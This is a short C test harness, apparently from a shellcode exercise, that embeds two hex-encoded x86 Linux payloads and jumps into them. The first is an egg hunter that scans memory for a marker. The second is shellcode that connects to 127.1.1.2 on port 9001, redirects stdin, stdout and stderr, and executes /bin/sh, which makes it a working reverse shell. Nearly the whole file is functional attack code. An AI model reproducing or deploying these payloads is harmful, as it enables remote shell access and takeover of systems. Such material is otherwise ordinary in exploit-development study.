#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
unsigned char shellcode[] = "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x68\x7f\x01\x01\x02\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Egg hunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d\n", strlen(shellcode));

    void (*s)() = (void *)egghunter;
    s();

    return 0;
}